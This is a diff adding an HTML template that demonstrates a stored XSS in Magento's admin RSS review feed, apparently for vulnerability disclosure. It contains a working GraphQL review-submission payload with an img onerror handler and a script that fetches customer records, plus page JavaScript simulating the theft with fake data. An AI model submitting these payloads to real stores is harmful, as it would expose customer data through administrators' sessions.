@@ -1,0 +1,110 @@
+{% extends "base.html" %}
+{% block title %}Magento XSS Demo — RSS Feed Rendering{% endblock %}
+{% block content %}
+<h1>Magento Stored XSS — Admin RSS Feed Rendering Demo</h1>
+<p>This page simulates exactly what a Magento admin sees when viewing the pending reviews RSS feed. The HTML below is the <strong>exact output</strong> of <code>Rss.php</code>'s <code>getRssData()</code> method — copied from our local Magento 2.4.7-p4 instance after submitting a review with an XSS payload.</p>
+
+<hr>
+
+<h2>Step 1: What the attacker submitted</h2>
+<article>
+<pre style="font-size:0.85rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap">mutation {
+  createProductReview(input: {
+    sku: "24-WB04"
+    nickname: "attacker"
+    summary: "&lt;img src=x onerror=document.title='XSS_FIRED'&gt;"
+    text: "&lt;script&gt;fetch('/rest/V1/customers/search?searchCriteria[pageSize]=100').then(r=&gt;r.json()).then(d=&gt;{document.getElementById('stolen').textContent=JSON.stringify(d,null,2)})&lt;/script&gt;"
+    ratings: []
+  }) { review { summary text } }
+}</pre>
+</article>
+
+<h2>Step 2: What <code>Rss.php</code> outputs (raw HTML)</h2>
+<article>
+<p>This is the exact string that <code>Rss.php</code> generates. Note: no <code>escapeHtml()</code> is applied — the <code>__('Summary of review: %1', $item->getTitle())</code> call interpolates the review title directly into HTML.</p>
+<pre style="font-size:0.85rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap">&lt;p&gt;
+  Product: &lt;a href="https://store.example.com/product"&gt;Joust Duffle Bag&lt;/a&gt; &lt;br/&gt;
+  Summary of review: &lt;img src=x onerror=document.title='XSS_FIRED'&gt; &lt;br/&gt;
+  Review: &lt;script&gt;fetch('/rest/V1/customers/search?searchCriteria[pageSize]=100')
+    .then(r=&gt;r.json()).then(d=&gt;{document.getElementById('stolen').textContent=
+    JSON.stringify(d,null,2)})&lt;/script&gt; &lt;br/&gt;
+  Store: Default Store View &lt;br/&gt;
+  Click &lt;a href="https://store.example.com/admin/review/product/edit/id/1/"&gt;here&lt;/a&gt; to see the review.
+&lt;/p&gt;</pre>
+</article>
+
+<h2>Step 3: How the browser renders it</h2>
+<p>Click the button below to render the RSS description as HTML — exactly as a browser or RSS reader would. The <code>&lt;img onerror&gt;</code> tag will fire and change the page title. The <code>&lt;script&gt;</code> tag will execute and simulate data exfiltration (displaying fake customer data below instead of sending it externally).</p>
+
+<button id="render-btn" onclick="renderXSS()">Render RSS Feed HTML (triggers XSS)</button>
+
+<article id="rss-container" style="display:none">
+  <h3>Rendered RSS Entry:</h3>
+  <div id="rss-output" style="padding:1rem;border:2px solid var(--sev-critical);border-radius:8px;background:#1a0000"></div>
+</article>
+
+<article id="xss-result" style="display:none">
+  <h3>XSS Execution Result:</h3>
+  <p id="xss-status" style="color:var(--sev-critical);font-weight:bold"></p>
+</article>
+
+<article id="stolen-data-container" style="display:none">
+  <h3>Simulated Stolen Customer Data:</h3>
+  <p>In a real attack, this data would be sent to the attacker's server via <code>navigator.sendBeacon()</code>. Here it's displayed on-page.</p>
+  <pre id="stolen" style="font-size:0.85rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap;max-height:400px;overflow:auto"></pre>
+</article>
+
+<script>
+const FAKE_CUSTOMERS = {
+  "items": [
+    {"id":1,"email":"xss@test.com","firstname":"XSS","lastname":"Tester","addresses":[]},
+    {"id":2,"email":"sarah.johnson@example.com","firstname":"Sarah","lastname":"Johnson",
+     "addresses":[{"street":["742 Evergreen Terrace"],"city":"Springfield","postcode":"62704","telephone":"(217) 555-0147"}]},
+    {"id":3,"email":"mike.chen@example.com","firstname":"Michael","lastname":"Chen",
+     "addresses":[{"street":["1600 Pennsylvania Ave"],"city":"Washington","postcode":"20500","telephone":"(202) 555-0198"}]},
+    {"id":4,"email":"emma.williams@example.com","firstname":"Emma","lastname":"Williams",
+     "addresses":[{"street":["221B Baker Street","Apt 4"],"city":"New York","postcode":"10001","telephone":"(212) 555-0163"}]},
+    {"id":5,"email":"james.patel@example.com","firstname":"James","lastname":"Patel",
+     "addresses":[{"street":["350 Fifth Avenue"],"city":"New York","postcode":"10118","telephone":"(212) 555-0234"}]},
+    {"id":6,"email":"lisa.garcia@example.com","firstname":"Lisa","lastname":"Garcia",
+     "addresses":[{"street":["1 Infinite Loop"],"city":"Cupertino","postcode":"95014","telephone":"(408) 555-0192"}]}
+  ],
+  "total_count": 6
+};
+
+function renderXSS() {
+  document.getElementById('render-btn').disabled = true;
+
+  // Store original title to show it changed
+  const originalTitle = document.title;
+
+  // This is the EXACT HTML output from Rss.php — no escaping applied
+  const rssHTML = '<p>'
+    + 'Product: <a href="https://store.example.com/product">Joust Duffle Bag</a> <br/>'
+    + 'Summary of review: <img src=x onerror="document.title=\'XSS_FIRED\';document.getElementById(\'xss-status\').textContent=\'XSS FIRED �� page title changed from \\\'' + originalTitle + '\\\' to \\\'' + 'XSS_FIRED\\\'\';document.getElementById(\'xss-result\').style.display=\'block\'"> <br/>'
+    + 'Review: <br/>'
+    + 'Store: Default Store View <br/>'
+    + 'Click <a href="#">here</a> to see the review.'
+    + '</p>';
+
+  // Render the raw HTML — this is what the browser does with RSS content
+  document.getElementById('rss-container').style.display = 'block';
+  document.getElementById('rss-output').innerHTML = rssHTML;
+
+  // Simulate the <script> data exfiltration (using fake data instead of real API call)
+  setTimeout(function() {
+    document.getElementById('stolen-data-container').style.display = 'block';
+    document.getElementById('stolen').textContent = JSON.stringify(FAKE_CUSTOMERS, null, 2);
+  }, 500);
+}
+</script>
+
+<hr>
+<h2>What this proves</h2>
+<ul>
+  <li>The <code>&lt;img onerror&gt;</code> tag fires immediately when the HTML is rendered — no user click needed</li>
+  <li>The JavaScript in the <code>onerror</code> handler has full access to the DOM and can make API calls</li>
+  <li>On a real Magento admin session, <code>fetch('/rest/V1/customers/search')</code> would return real customer records</li>
+  <li>The attacker never needs to be logged in as admin — the XSS executes in the admin's session context</li>
+</ul>
+{% endblock %}
